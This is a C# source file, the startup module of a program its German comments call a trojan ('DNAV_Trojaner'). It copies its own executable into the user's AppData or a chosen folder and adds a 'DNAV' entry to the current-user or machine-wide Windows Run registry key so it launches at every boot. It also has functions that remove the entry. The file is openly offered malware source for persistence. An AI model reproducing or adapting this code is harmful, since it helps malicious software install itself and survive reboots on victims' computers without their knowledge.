using Microsoft.Win32;
using System.Windows.Forms;
using System.IO;
using System;

namespace DNAV_Trojaner
{
    class Startup
    {
        /// <summary>
        /// Startet den Trojaner beim Start von Windows.
        /// </summary>
        public static void Enable()
        {
            string src = Application.ExecutablePath;
            string file = Path.GetFileName(src);
            string dst = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\Tofu\";

            Directory.CreateDirectory(dst);
            File.Copy(src, dst + file);
            RegistryKey key = Registry.CurrentUser.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true);
            key.SetValue("DNAV", Application.ExecutablePath.ToString());
            key.Close();
        }

        /// <summary>
        /// Kopiert den Trojaner an einen anderen Ort und startet diesen beim Start von Windows.
        /// </summary>
        /// <param name="destinationPath">Ordner, in den der Trojaner kopiert werden soll.</param>
        /// <param name="executableName">Name des Trojaner Anwendung. Muss mit .exe enden</param>
        public static void CopyAndEnable(string destinationPath, string executableName)
        {
            Directory.CreateDirectory(destinationPath);
            File.Copy(Application.ExecutablePath, destinationPath + @"\" + executableName);
            RegistryKey key = Registry.CurrentUser.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true);
            key.SetValue("DNAV", destinationPath + @"\" + executableName);
            key.Close();
        }

        /// <summary>
        /// Deaktiviert den Autostart des Trojaners.
        /// </summary>
        public static void Disable()
        {
            RegistryKey key = Registry.CurrentUser.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true);
            key.DeleteValue("DNAV", false);
        }

        /// <summary>
        /// Startet den Trojaner beim Start von Windows. Wird benötigt, wenn der Trojaner nur mit Administratorrechten ausgeführt werden kann.
        /// </summary>
        public static void EnableForAdmin()
        {
            RegistryKey key = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true);
            key.SetValue("DNAV", Application.ExecutablePath.ToString());
            key.Close();
        }

        /// <summary>
        ///  Kopiert den Trojaner an einen anderen Ort und startet diesen beim Start von Windows. Wird benötigt, wenn der Trojaner nur mit Administratorrechten ausgeführt werden kann.
        /// </summary>
        /// <param name="destinationPath">Ordner, in den der Trojaner kopiert werden soll.</param>
        /// <param name="executableName">Name des Trojaner Anwendung. Muss mit .exe enden</param>
        public static void CopyAndEnableForAdmin(string destinationPath, string executableName)
        {
            Directory.CreateDirectory(destinationPath);
            File.Copy(Application.ExecutablePath, destinationPath + @"\" + executableName);
            RegistryKey key = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true);
            key.SetValue("DNAV", destinationPath + @"\" + executableName);
            key.Close();
        }

        /// <summary>
        /// Deaktiviert den Autostart des Trojaners mit Administratorrechten.
        /// </summary>
        public static void DisableForAdmin()
        {
            RegistryKey key = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true);
            key.DeleteValue("DNAV", false);
        }
    }
}
